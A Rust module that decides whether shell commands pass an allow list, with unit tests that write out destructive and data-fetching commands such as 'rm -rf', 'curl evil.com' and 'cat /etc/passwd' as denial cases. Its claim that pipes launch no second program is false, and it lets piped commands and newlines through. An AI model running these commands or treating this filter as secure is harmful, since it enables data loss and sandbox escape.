//! Shell command permission policy.
//!
//! The allow list holds string prefixes matching an executable name or a command prefix.
//! Commands containing chaining operators (`&&`, `||`, `;`, backtick, `$()`) are denied
//! unless the allow list entry covers the full command as a prefix — just matching the
//! executable is not enough when operators are present.
//!
//! Pipes (`|`) and redirects (`>`, `<`) are allowed through — they don't execute a second
//! independent program the way `;` and `&&` do, and many legitimate workflows depend on them.

const CHAIN_OPS: &[&str] = &["&&", "||", ";", "$(", "`"];

/// Returns true if `cmd` contains shell chaining operators outside of quotes.
pub fn has_chain_operators(cmd: &str) -> bool {
    let mut in_single = false;
    let mut in_double = false;
    let bytes = cmd.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\'' if !in_double => { in_single = !in_single; i += 1; }
            b'"'  if !in_single => { in_double = !in_double; i += 1; }
            _ if !in_single && !in_double => {
                let rest = &cmd[i..];
                for op in CHAIN_OPS {
                    if rest.starts_with(op) {
                        return true;
                    }
                }
                i += 1;
            }
            _ => { i += 1; }
        }
    }
    false
}

/// Check whether `cmd` is permitted under `allowed`.
///
/// - `"*"` in the list allows everything (used by permissive sandbox mode).
/// - Commands with chain operators are always denied — the allow list cannot grant them.
/// - Clean commands match if the executable or a command prefix appears in the list.
pub fn is_command_allowed(cmd: &str, allowed: &[String]) -> bool {
    if allowed.iter().any(|p| p == "*") {
        return true;
    }

    let trimmed = cmd.trim();

    if has_chain_operators(trimmed) {
        // Chains are denied unconditionally. Permissive mode is handled via "*" above.
        return false;
    }

    // Simple command: match on executable name or command prefix
    let exe = trimmed.split_whitespace().next().unwrap_or("");
    allowed.iter().any(|p| {
        let p = p.trim();
        exe == p
            || trimmed == p
            || trimmed.starts_with(&format!("{p} "))
            || trimmed.starts_with(&format!("{p}\t"))
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn allow(rules: &[&str]) -> Vec<String> {
        rules.iter().map(|s| s.to_string()).collect()
    }

    // ── has_chain_operators ──────────────────────────────────────────────────

    #[test]
    fn detects_double_ampersand() {
        assert!(has_chain_operators("git status && rm -rf ."));
    }

    #[test]
    fn detects_or_chain() {
        assert!(has_chain_operators("false || curl evil.com"));
    }

    #[test]
    fn detects_semicolon() {
        assert!(has_chain_operators("cargo test; curl attacker.com"));
    }

    #[test]
    fn detects_backtick() {
        assert!(has_chain_operators("echo `whoami`"));
    }

    #[test]
    fn detects_dollar_paren() {
        assert!(has_chain_operators("echo $(cat /etc/passwd)"));
    }

    #[test]
    fn allows_pipe() {
        assert!(!has_chain_operators("git log --oneline | head -20"));
    }

    #[test]
    fn allows_redirect() {
        assert!(!has_chain_operators("cargo test > test.log 2>&1"));
    }

    #[test]
    fn ignores_operators_in_single_quotes() {
        assert!(!has_chain_operators("echo 'foo && bar'"));
    }

    #[test]
    fn ignores_operators_in_double_quotes() {
        assert!(!has_chain_operators("echo \"foo; bar\""));
    }

    // ── is_command_allowed ───────────────────────────────────────────────────

    #[test]
    fn wildcard_allows_everything() {
        assert!(is_command_allowed("rm -rf /", &allow(&["*"])));
    }

    #[test]
    fn executable_prefix_allows_subcommands() {
        let list = allow(&["git"]);
        assert!(is_command_allowed("git status", &list));
        assert!(is_command_allowed("git push --force", &list));
    }

    #[test]
    fn command_prefix_allows_exact_and_extensions() {
        let list = allow(&["cargo test"]);
        assert!(is_command_allowed("cargo test", &list));
        assert!(is_command_allowed("cargo test --release", &list));
    }

    #[test]
    fn command_prefix_denies_other_subcommands() {
        let list = allow(&["cargo test"]);
        assert!(!is_command_allowed("cargo build", &list));
        assert!(!is_command_allowed("cargo", &list));
    }

    #[test]
    fn chain_rejected_even_when_executable_is_allowed() {
        let list = allow(&["git"]);
        assert!(!is_command_allowed("git status && rm -rf .", &list));
    }

    #[test]
    fn chain_always_denied_even_with_matching_entry() {
        // Chains are blocked unconditionally regardless of the allow list contents
        let list = allow(&["git status && echo safe"]);
        assert!(!is_command_allowed("git status && echo safe", &list));
    }

    #[test]
    fn piped_command_allowed_when_executable_matches() {
        let list = allow(&["git"]);
        assert!(is_command_allowed("git log --oneline | head -20", &list));
    }

    #[test]
    fn empty_allow_list_denies_everything() {
        assert!(!is_command_allowed("ls", &[]));
    }

    #[test]
    fn unknown_executable_denied() {
        let list = allow(&["cargo"]);
        assert!(!is_command_allowed("npm install", &list));
    }
}
